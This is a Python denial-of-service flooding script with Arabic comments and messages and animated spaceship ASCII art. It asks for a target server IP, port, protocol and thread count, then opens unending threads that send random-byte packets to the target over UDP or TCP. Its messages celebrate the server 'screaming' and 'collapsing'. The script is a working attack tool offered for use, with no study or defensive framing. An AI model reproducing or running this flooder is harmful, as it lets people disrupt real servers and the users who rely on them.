import random
import socket
import threading
import platform
import time
import sys
import os
from colorama import init, Fore, Style

# تفعيل الألوان
init(autoreset=True)

# رسومات فضائية متغيرة
frames = [
    Fore.RED + r"""
       .        .        .        .
    .    *          *       .       *
        .         ______________
     *    .    .-'              '-.
          .  .'      O      O      '.
         .  /     ________       .  \
  *       |      \______/          |
          \          (_)         . /
           '.                  .'
             '-.___________.-'
    """,

    Fore.BLUE + r"""
       .        .        .        .
    .    *          *       .       *
        .         ______________
     *    .    .-'   O      O   '-.
          .  .'      ________     '.
         .  /       /        \      \
  *       |        \________/        |
          \         ______         . /
           '.       \____/       .'
             '-.______________.-'
    """,

    Fore.GREEN + r"""
       *        *        *        *
    *    .          .       *       .
        *         ______________
     .    *    .-'     O   O     '-.
          .  .'     .--------.     '.
         *  /       |        |       \
  .       |         |________|        |
          \          _______        . /
           '.        \_____/      .'
             '-.______________.-'
    """
]

# طباعة أنميشن فضائي
def animate_spaceship():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        frame = random.choice(frames)
        print(frame)
        time.sleep(0.7)

# بداية الأنميشن
threading.Thread(target=animate_spaceship, daemon=True).start()

# انتظار بسيط لعرض الأنميشن
time.sleep(2)

# إدخال البيانات
print(Fore.YELLOW + "\n[+] نظام التشغيل: " + platform.system())
ip = str(input(Fore.CYAN + "Server IP         : "))
port = int(input("Port              : "))
choice = str(input("Use UDP (y/n)     : "))
times = int(input("Packets/Thread    : "))
threads = int(input("Threads           : "))

# رسائل عشوائية
messages = [
    "[+] المجرة تشتعل...",
    "[*] إشارات مشوشة تُرسل...",
    "[×] اختراق في الزمن...",
    "[!] هجوم موجات كونية...",
    "[#] السيرفر يصرخ..."
]
last_msg = None

def get_unique_message():
    global last_msg
    msg = random.choice(messages)
    while msg == last_msg:
        msg = random.choice(messages)
    last_msg = msg
    return msg

# UDP
def run_udp():
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, addr)
            print(Fore.MAGENTA + get_unique_message())
        except:
            print(Fore.RED + "[!] السيرفر انهار (UDP)!")

# TCP
def run_tcp():
    data = random._urandom(512)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for _ in range(times):
                s.send(data)
            print(Fore.CYAN + get_unique_message())
        except:
            s.close()
            print(Fore.RED + "[!] السيرفر انهار (TCP)!")

# تشغيل الهجوم
for _ in range(threads):
    if choice.lower() == 'y':
        th = threading.Thread(target=run_udp)
    else:
        th = threading.Thread(target=run_tcp)
    th.start()